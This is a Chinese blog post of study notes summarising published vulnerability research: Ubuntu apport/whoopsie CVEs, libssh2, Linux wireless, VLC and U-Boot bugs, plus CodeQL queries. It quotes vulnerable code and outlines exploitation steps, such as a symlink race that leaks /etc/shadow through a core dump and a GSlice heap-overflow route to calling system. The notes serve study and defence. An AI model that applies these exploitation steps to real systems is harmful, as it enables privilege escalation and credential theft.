Stroom</h2><p>来了，XSS。</p><p>是因为<code>&quot;stroom.my-company.com.attacker.com&quot;.indexOf(&quot;stroom.my-company.com&quot;) == 0</code>这句话被绕过。</p><h2 id="Fuzz常见的挑战和解决方案"><a href="#Fuzz常见的挑战和解决方案" class="headerlink" title="Fuzz常见的挑战和解决方案"></a>Fuzz常见的挑战和解决方案</h2><p>这是要改造fuzzer？</p><ul><li>fuzz命令行参数和输入文件</li><li>fuzzer比较难覆盖到比如==某确定值的代码，这时候可以拆分一下，把该==条件拆分成多个条件；</li><li>提供自定义词典；</li><li>效验文件格式，算剪枝吧；</li><li>自定义覆盖，也算剪枝的一种，就是不去覆盖那些不感兴趣的代码；</li></ul><h2 id="Chromium-IPC漏洞"><a href="#Chromium-IPC漏洞" class="headerlink" title="Chromium IPC漏洞"></a>Chromium IPC漏洞</h2><blockquote><p>All of these issues, with the exception of 1001503 (which was found by ‘accident’ when I was experimenting with IPC calls), were found by manual code review with the help of CodeQL.</p></blockquote><p>虽然又闻到了广告的气息，但是CodeQL是真的香了起来。</p><p>讲了Mojo以及旧IPC的一些bug：</p><p>A raw pointer is a pointer whose lifetime is not controlled by an encapsulating object, such as a smart pointer.</p><p>raw pointer跟unique pointer是普通指针跟智能指针；可能智能指令的使用越来越多，才一直用raw pointer这种说法吧。</p><ul><li>非特权指针fields管理，尤其是在UAF的情况；<ul><li>Raw pointer points to owner；</li><li>Destructor of raw pointer class removes its reference；</li></ul></li><li>回调函数存储raw pointer；<ul><li>回调发生在不能调用raw pointer的时候，但通常这是由caller去控制的；</li></ul></li><li>RenderFrameHost生命周期；<ul><li>通常RenderFrameHost生命周期很长，可以活的更长的线程回调去调它的时候，它就凉了；</li></ul></li></ul><h2 id="Ubuntu-Whoopsie-Vulns-系列文章"><a href="#Ubuntu-Whoopsie-Vulns-系列文章" class="headerlink" title="Ubuntu Whoopsie Vulns 系列文章"></a>Ubuntu Whoopsie Vulns 系列文章</h2><p><a href="https://securitylab.github.com/research/ubuntu-whoopsie-daisy-overview" target="_blank" rel="noopener">https://securitylab.github.com/research/ubuntu-whoopsie-daisy-overview</a></p><h3 id="（一）Whoopsie的LPE利用链"><a href="#（一）Whoopsie的LPE利用链" class="headerlink" title="（一）Whoopsie的LPE利用链"></a>（一）Whoopsie的LPE利用链</h3><p>讲了一堆我记不太清编号的CVE，分别的大致作用，来提升特权。</p><ul><li>CVE-2019-11476和CVE-2019-11481是Dos；</li><li>CVE-2019-11484+CVE-2019-15790=RCE；</li><li>CVE-2019-7307和CVE-2019-15790读取任意文件到crash里；</li></ul><p>还有一些其它信息：</p><ul><li>apport-gtk只与用户交互；</li><li>apport是root权限，还可以接收用户发的signal；</li><li>whoopsie特权很少，但是可以读crash文件，并发到daisy.ubuntu.com，但是有<code>URLOPT_SSL_VERIFYPEER</code>，不能欺骗；</li></ul><h3 id="（二）CVE-2019-7307"><a href="#（二）CVE-2019-7307" class="headerlink" title="（二）CVE-2019-7307"></a>（二）CVE-2019-7307</h3><h4 id="CVE-2019-7307"><a href="#CVE-2019-7307" class="headerlink" title="CVE-2019-7307"></a>CVE-2019-7307</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> os.access(ifpath, os.R_OK) <span class="keyword">or</span> os.path.getsize(ifpath) == <span class="number">0</span>:</span><br><span class="line">    <span class="comment"># create a document from scratch</span></span><br><span class="line">    dom = xml.dom.getDOMImplementation().createDocument(<span class="literal">None</span>, <span class="string">'apport'</span>, <span class="literal">None</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        dom = xml.dom.minidom.parse(ifpath)</span><br><span class="line">    <span class="keyword">except</span> ExpatError <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'%s has invalid format: %s'</span> % (_ignore_file, str(e)))</span><br></pre></td></tr></table></figure><p>典型的TOCTOU，用软链接去攻击<code>~/.apport-ignore.xml</code>。</p><h4 id="CVE-2019-11481"><a href="#CVE-2019-11481" class="headerlink" title="CVE-2019-11481"></a>CVE-2019-11481</h4><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_config</span><span class="params">(section, setting, default=None, path=None, bool=False)</span>:</span></span><br><span class="line">    <span class="string">'''Return a setting from user configuration.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    This is read from ~/.config/apport/settings or path. If bool is True, the</span></span><br><span class="line"><span class="string">    value is interpreted as a boolean.</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> get_config.config:</span><br><span class="line">        get_config.config = ConfigParser()</span><br><span class="line">        <span class="keyword">if</span> path:</span><br><span class="line">            get_config.config.read(path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            get_config.config.read(os.path.expanduser(_config_file))</span><br></pre></td></tr></table></figure><p>这种攻击的时候会发现解析错误，就是个Dos。</p><h4 id="7307利用思路"><a href="#7307利用思路" class="headerlink" title="7307利用思路"></a>7307利用思路</h4><ol><li>I start /bin/sleep and crash it by sending it a SIGSEGV.</li><li>Apport starts up to generate a crash report for /bin/sleep.</li><li>I replace ~/.apport-ignore.xml with a symlink at exactly the right moment, so that apport loads a forbidden file into memory.</li><li>I crash apport by sending it a SIGSEGV.</li><li>A second apport starts up to generate a crash report for the first apport.<br>The second apport writes out a crash report for the first, containing a copy of the forbidden file in the core dump.</li></ol><p>利用问题及解决方法：</p><ul><li>它自身有防递归的文件锁；但是这<em>only advisory</em>，可以替换<code>/var/crash/.lock</code>，替换的手法是，该文件会定期被删，我们直接创建；</li><li><code>RLIMIT_CORE</code>位为1标记该进程是一个crash reporter不能再生成core dump文件；可以用prlimt修改<code>RLIMIT_CORE</code>，虽然不能增加，但是修改为0足够了；</li><li>还有，它在python里限制了一些信号处理，比如<code>SIGSEGV</code>，我们找找它没限制到的，比如<code>SIGTRAP</code>；</li></ul><p>有点道高一尺魔高一丈的感觉。</p><p>然后利用，出现的新问题是产生的文件是root权限的，因为py使用过os.stat，<code>/proc/[pid]/stat</code>是root权限的，但是产生的文件是对了，确实读取了<code>/etc/shadow</code>。</p><h3 id="（三）CVE-2019-15790"><a href="#（三）CVE-2019-15790" class="headerlink" title="（三）CVE-2019-15790"></a>（三）CVE-2019-15790</h3><p>一句话总结漏洞就是”Use PID after Killed”。</p><h4 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h4><ul><li>Plan A: 用这个来解决7307的问题，替换<code>/proc/[pid]/stat</code>，但是不行，apport在很早就检查了<code>/proc/[pid]/stat</code>的所有权，在那之前kill process的话，就不能正常读了，虽然有64K缓冲区，但是没有有用信息；</li><li>Plan B: 先起无害进程让他崩溃，暂停apport，再起目标进程分配到无害进程的PID上，再continue apport，这样就可以从<code>/proc/[pid]</code>中读到目标进程的一些信息比如ASLR；</li><li>最后玩一下PID Feng Shui（所以Heap Feng Shui是中国人还是外国人起的名啊？有没有懂哥解答一下）</li></ul><h3 id="（四）CVE-2019-11484-–-Ubuntu-whoopsie-integer-overflow"><a href="#（四）CVE-2019-11484-–-Ubuntu-whoopsie-integer-overflow" class="headerlink" title="（四）CVE-2019-11484 – Ubuntu whoopsie integer overflow"></a>（四）CVE-2019-11484 – Ubuntu whoopsie integer overflow</h3><p>whoopsie是”Ubuntu错误报告”守护程序。</p><h4 id="CVE-2019-11476"><a href="#CVE-2019-11476" class="headerlink" title="CVE-2019-11476"></a>CVE-2019-11476</h4><p>造一个字符串length长一点不太到2^31，绕过检查，然后<code>value_pos + 1 + value_length + 1</code>的时候溢出，realloc返回空，但是只能造成Dos。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* The length of this value string */</span></span><br><span class="line">value_length = token_p - p;</span><br><span class="line"><span class="keyword">if</span> (value) &#123;</span><br><span class="line">    <span class="comment">/* Space for the leading newline too. */</span></span><br><span class="line">    value_pos = value_p - value;</span><br><span class="line">    <span class="keyword">if</span> (INT_MAX - (<span class="number">1</span> + value_length + <span class="number">1</span>) &lt; value_pos) &#123;</span><br><span class="line">        g_set_error (error,</span><br><span class="line">                     g_quark_from_static_string (<span class="string">"whoopsie-quark"</span>),</span><br><span class="line">                     <span class="number">0</span>, <span class="string">"Report value too long."</span>);</span><br><span class="line">        <span class="keyword">goto</span> error;</span><br><span class="line">    &#125;</span><br><span class="line">    value = g_realloc (value, value_pos + <span class="number">1</span> + value_length + <span class="number">1</span>);</span><br><span class="line">    value_p = value + value_pos;</span><br><span class="line">    *value_p = <span class="string">'\n'</span>;</span><br><span class="line">    value_p++;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure><h4 id="另一处vuln"><a href="#另一处vuln" class="headerlink" title="另一处vuln"></a>另一处vuln</h4><p><code>pos + bytesNeeded</code>溢出，并没有继续分配内存，而且直接返回成功。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">bson_ensure_space</span><span class="params">( bson *b, <span class="keyword">const</span> <span class="keyword">int</span> bytesNeeded )</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> pos = b-&gt;cur - b-&gt;data;</span><br><span class="line">    <span class="keyword">char</span> *orig = b-&gt;data;</span><br><span class="line">    <span class="keyword">int</span> new_size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> ( pos + bytesNeeded &lt;= b-&gt;dataSize )</span><br><span class="line">        <span class="keyword">return</span> BSON_OK;</span><br></pre></td></tr></table></figure><h4 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h4><p>堆溢出嘛，攻击GSlice分配器的单向链表的next：</p><ul><li>由上面的文章可以知道ASLR；</li><li>指针必须是有较UTF-8；伪块不包含next结构，随时会崩；</li><li>任意地址写哪里呢？全局变量<code>glib_worker_context-&gt;source_lists-&gt;_GSourceFuncs</code>里的函数指针改成system，然后GSource里放”/tmp/kev.sh”，执行任意脚本；</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> _<span class="title">GSourceFuncs</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  gboolean (*prepare)  (GSource    *source,</span><br><span class="line">                        gint       *timeout_);</span><br><span class="line">  gboolean (*check)    (GSource    *source);</span><br><span class="line">  gboolean (*dispatch) (GSource    *source,</span><br><span class="line">                        GSourceFunc callback,</span><br><span class="line">                        gpointer    user_data);</span><br><span class="line">  <span class="keyword">void</span>     (* finalize) (GSource    * source); <span class="comment">/* Can be NULL */</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* &lt; private &gt; */</span></span><br><span class="line">  <span class="comment">/* For use by g_source_set_closure */</span></span><br><span class="line">  GSourceFunc     closure_callback;</span><br><span class="line">  GSourceDummyMarshal closure_marshal; <span class="comment">/* Really is of type GClosureMarshal */</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="CodeQL软广-–-挖rsyslog"><a href="#CodeQL软广-–-挖rsyslog" class="headerlink" title="CodeQL软广 – 挖rsyslog"></a>CodeQL软广 – 挖rsyslog</h2><ul><li>威胁建模</li><li>分析程序输入</li><li>锁定一个输入进一步分析</li><li>数据流分析</li><li>寻找变体</li></ul><h2 id="libssh2相关漏洞"><a href="#libssh2相关漏洞" class="headerlink" title="libssh2相关漏洞"></a>libssh2相关漏洞</h2><blockquote><p>On March 18, 2019, Chris Coulson of Canonical Ltd. disclosed nine vulnerabilities in libssh2 (CVE-2019-3855 to CVE-2019-3863).</p></blockquote><h3 id="有-无符号类型转换"><a href="#有-无符号类型转换" class="headerlink" title="有/无符号类型转换"></a>有/无符号类型转换</h3><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>((p_len = _libssh2_get_c_string(&amp;buf, &amp;p)) &lt; <span class="number">0</span>)</span><br></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> _libssh2_check_length(struct string_buf *buf, <span class="keyword">size_t</span> len)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">return</span> ((<span class="keyword">int</span>)(buf-&gt;dataptr - buf-&gt;data) &lt;= (<span class="keyword">int</span>)(buf-&gt;len - len)) ? <span class="number">1</span> : <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>类似于这样的，有/无符号强制乱转换。</p><h3 id="整数溢出（CVE-2019-17498）"><a href="#整数溢出（CVE-2019-17498）" class="headerlink" title="整数溢出（CVE-2019-17498）"></a>整数溢出（CVE-2019-17498）</h3><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(message_len &lt; datalen<span class="number">-13</span>) &#123;      <span class="comment">// &lt;- datalen被远程服务器控制，可能小于13，绕过检查</span></span><br><span class="line">    <span class="comment">/* 9 = packet_type(1) + reason(4) + message_len(4) */</span></span><br><span class="line">    message = (<span class="keyword">char</span> *) data + <span class="number">9</span>;</span><br><span class="line"></span><br><span class="line">    language_len =</span><br><span class="line">        _libssh2_ntohu32(data + <span class="number">9</span> + message_len);   <span class="comment">// &lt;- 越界读</span></span><br><span class="line">    language = (<span class="keyword">char</span> *) data + <span class="number">9</span> + message_len + <span class="number">4</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(language_len &gt; (datalen<span class="number">-13</span>-message_len)) &#123;</span><br><span class="line">        <span class="comment">/* bad input, clear info */</span></span><br><span class="line">        language = message = <span class="literal">NULL</span>;</span><br><span class="line">        language_len = message_len = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* bad size, clear it */</span></span><br><span class="line">    message_len = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(session-&gt;ssh_msg_disconnect) &#123;                   <span class="comment">// &lt;- 回调函数</span></span><br><span class="line">LIBSSH2_DISCONNECT(session, reason, message,</span><br><span class="line">                    message_len, language, language_len);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>然后就是CodeQL的软广了。</p><h2 id="CodeQL与Java反序列化"><a href="#CodeQL与Java反序列化" class="headerlink" title="CodeQL与Java反序列化"></a>CodeQL与Java反序列化</h2><p><a href="https://securitylab.github.com/research/in-memory-data-grid-vulnerabilities" target="_blank" rel="noopener">https://securitylab.github.com/research/in-memory-data-grid-vulnerabilities</a></p><h2 id="Wireless-Vulnerabilities-in-Linux-Kernel-–-CVE-2019-14814-5-6"><a href="#Wireless-Vulnerabilities-in-Linux-Kernel-–-CVE-2019-14814-5-6" class="headerlink" title="Wireless Vulnerabilities in Linux Kernel – CVE-2019-14814/5/6"></a>Wireless Vulnerabilities in Linux Kernel – CVE-2019-14814/5/6</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">rate_ie = (<span class="keyword">void</span> *)cfg80211_find_ie(WLAN_EID_SUPP_RATES, var_pos, len); <span class="comment">//[1]</span></span><br><span class="line"><span class="keyword">if</span> (rate_ie) &#123;</span><br><span class="line">    <span class="built_in">memcpy</span>(bss_cfg-&gt;rates, rate_ie + <span class="number">1</span>, rate_ie-&gt;len); <span class="comment">//[2]</span></span><br><span class="line">    rate_len = rate_ie-&gt;len;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">rate_ie = (<span class="keyword">void</span> *)cfg80211_find_ie(WLAN_EID_EXT_SUPP_RATES,</span><br><span class="line">                    params-&gt;beacon.tail,</span><br><span class="line">                    params-&gt;beacon.tail_len); <span class="comment">//[3]</span></span><br><span class="line"><span class="keyword">if</span> (rate_ie)</span><br><span class="line">    <span class="built_in">memcpy</span>(bss_cfg-&gt;rates + rate_len, rate_ie + <span class="number">1</span>, rate_ie-&gt;len); <span class="comment">//[4]</span></span><br></pre></td></tr></table></figure><p>memcpy时堆溢出。可以直接通过wifi触发，不需要认证交互。</p><p>下面是CodeQL软广，主要是，我并不太会用CodeQL，所以先记下，学完CodeQL再细看。</p><ul><li>CVE-2019-16746</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!conf-&gt;ibss_joined) &#123;</span><br><span class="line">    <span class="keyword">const</span> u8 *ssidie;</span><br><span class="line">    rcu_read_lock();</span><br><span class="line">    ssidie = ieee80211_bss_get_ie(bss, WLAN_EID_SSID);</span><br><span class="line">    <span class="keyword">if</span> (ssidie) &#123;</span><br><span class="line">        join.ssid_len = ssidie[<span class="number">1</span>];</span><br><span class="line">        <span class="built_in">memcpy</span>(join.ssid, &amp;ssidie[<span class="number">2</span>], join.ssid_len);</span><br></pre></td></tr></table></figure><ul><li>CVE-2019-17133</li></ul><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ie = ieee80211_bss_get_ie(&amp;wdev-&gt;current_bss-&gt;pub,</span><br><span class="line">                WLAN_EID_SSID);</span><br><span class="line"><span class="keyword">if</span> (ie) &#123;</span><br><span class="line">    data-&gt;flags = <span class="number">1</span>;</span><br><span class="line">    data-&gt;length = ie[<span class="number">1</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(ssid, ie + <span class="number">2</span>, data-&gt;length);</span><br></pre></td></tr></table></figure><h2 id="GitHub安全研究团队发现的VLC漏洞"><a href="#GitHub安全研究团队发现的VLC漏洞" class="headerlink" title="GitHub安全研究团队发现的VLC漏洞"></a>GitHub安全研究团队发现的VLC漏洞</h2><p>About <a href="https://en.wikipedia.org/wiki/VLC_media_player" target="_blank" rel="noopener">VLC</a>。</p><p><img src="vlc-vulns.png" alt="a summary of VLC vulns"></p><h3 id="CVE-2019-14437"><a href="#CVE-2019-14437" class="headerlink" title="CVE-2019-14437"></a>CVE-2019-14437</h3><p>This vulnerability could be triggered by inserting specially crafted headers which are not correctly counted by the xiph_CountHeaders function. 所以会有越界写。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">unsigned</span> <span class="keyword">int</span> <span class="title">xiph_CountHeaders</span><span class="params">( <span class="keyword">const</span> <span class="keyword">void</span> *extra, <span class="keyword">unsigned</span> <span class="keyword">int</span> i_extra )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">const</span> <span class="keyword">uint8_t</span> *p_extra = (<span class="keyword">uint8_t</span> *) extra;</span><br><span class="line">    <span class="keyword">if</span> ( !i_extra ) <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ( xiph_IsOldFormat( extra, i_extra ) )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Check headers count */</span></span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">int</span> overall_len = <span class="number">6</span>;</span><br><span class="line">        <span class="keyword">for</span> ( <span class="keyword">int</span> i=<span class="number">0</span>; i&lt;<span class="number">3</span>; i++ )</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">uint16_t</span> i_size = GetWBE( extra );</span><br><span class="line">            p_extra += <span class="number">2</span> + i_size;</span><br><span class="line">            <span class="keyword">if</span> ( i_extra &lt; i_size || overall_len &gt; i_extra - i_size )</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">            overall_len += i_size;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> *p_extra + <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="CVE-2019-14533"><a href="#CVE-2019-14533" class="headerlink" title="CVE-2019-14533"></a>CVE-2019-14533</h3><p>有个指针忘记置空了，造成UAF。</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">DemuxEnd</span><span class="params">( <span class="keyword">demux_t</span> *p_demux )</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">demux_sys_t</span> *p_sys = p_demux-&gt;p_sys;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>( p_sys-&gt;p_root )</span><br><span class="line">    &#123;</span><br><span class="line">        ASF_FreeObjectRoot( p_demux-&gt;s, p_sys-&gt;p_root );</span><br><span class="line">        p_sys-&gt;p_root = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="comment">//p_sys-&gt;p_fp should also be nulled</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    [...]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="U-Boot-NFS-RCE-Vulnerabilities（CVE-2019-14192）"><a href="#U-Boot-NFS-RCE-Vulnerabilities（CVE-2019-14192）" class="headerlink" title="U-Boot NFS RCE Vulnerabilities（CVE-2019-14192）"></a>U-Boot NFS RCE Vulnerabilities（CVE-2019-14192）</h2><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">nfs_readlink_reply</span><span class="params">(uchar *pkt, <span class="keyword">unsigned</span> len)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    [...]</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* new path length */</span></span><br><span class="line">    rlen = ntohl(rpc_pkt.u.reply.data[<span class="number">1</span> + nfsv3_data_offset]);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (*((<span class="keyword">char</span> *)&amp;(rpc_pkt.u.reply.data[<span class="number">2</span> + nfsv3_data_offset])) != <span class="string">'/'</span>) &#123;</span><br><span class="line">        <span class="keyword">int</span> pathlen;</span><br><span class="line"></span><br><span class="line">        <span class="built_in">strcat</span>(nfs_path, <span class="string">"/"</span>);</span><br><span class="line">        pathlen = <span class="built_in">strlen</span>(nfs_path);</span><br><span class="line">        <span class="built_in">memcpy</span>(nfs_path + pathlen,</span><br><span class="line">               (uchar *)&amp;(rpc_pkt.u.reply.data[<span class="number">2</span> + nfsv3_data_offset]),</span><br><span class="line">               rlen);</span><br><span class="line">        nfs_path[pathlen + rlen] = <span class="number">0</span>;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">memcpy</span>(nfs_path,</span><br><span class="line">               (uchar *)&amp;(rpc_pkt.u.reply.data[<span class="number">2</span> + nfsv3_data_offset]),</span><br><span class="line">               rlen);</span><br><span class="line">        nfs_path[rlen] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这些洞大多是普通的溢出，比如这个memcpy没有校验rlen，而它最多只有2048字节。</p><p>（CodeQL软文）</p><h2 id="用CodeQL查找Java反序列化漏洞"><a href="#用CodeQL查找Java反序列化漏洞" class="headerlink" title="用CodeQL查找Java反序列化漏洞"></a>用CodeQL查找Java反序列化漏洞</h2><h3 id="查找出所有可能造成反序列化的点"><a href="#查找出所有可能造成反序列化的点" class="headerlink" title="查找出所有可能造成反序列化的点"></a>查找出所有可能造成反序列化的点</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line"></span><br><span class="line">from MethodAccess <span class="keyword">call</span>, Method readobject</span><br><span class="line"><span class="keyword">where</span></span><br><span class="line">  call.getMethod() = readobject <span class="keyword">and</span></span><br><span class="line">  readobject.hasName(<span class="string">"readObject"</span>) <span class="keyword">and</span></span><br><span class="line">  readobject.getDeclaringType().hasQualifiedName(<span class="string">"java.io"</span>, <span class="string">"ObjectInputStream"</span>)</span><br><span class="line"><span class="keyword">select</span> <span class="keyword">call</span></span><br></pre></td></tr></table></figure><p>找的太多了，缩小范围，只找与输入挂钩的。</p><h3 id="source-and-sink"><a href="#source-and-sink" class="headerlink" title="source and sink"></a>source and sink</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import java</span><br><span class="line">import semmle.code.java.security.DataFlow</span><br><span class="line"></span><br><span class="line">class UnsafeDeserializationSink extends Expr &#123;</span><br><span class="line">  UnsafeDeserializationSink() &#123;</span><br><span class="line">    exists(MethodAccess <span class="keyword">call</span>, Method readobject |</span><br><span class="line">      call.getMethod() = readobject <span class="keyword">and</span></span><br><span class="line">      readobject.hasName(<span class="string">"readObject"</span>) <span class="keyword">and</span></span><br><span class="line">      readobject.getDeclaringType().hasQualifiedName(<span class="string">"java.io"</span>, <span class="string">"ObjectInputStream"</span>) <span class="keyword">and</span></span><br><span class="line">      this = call.getQualifier()</span><br><span 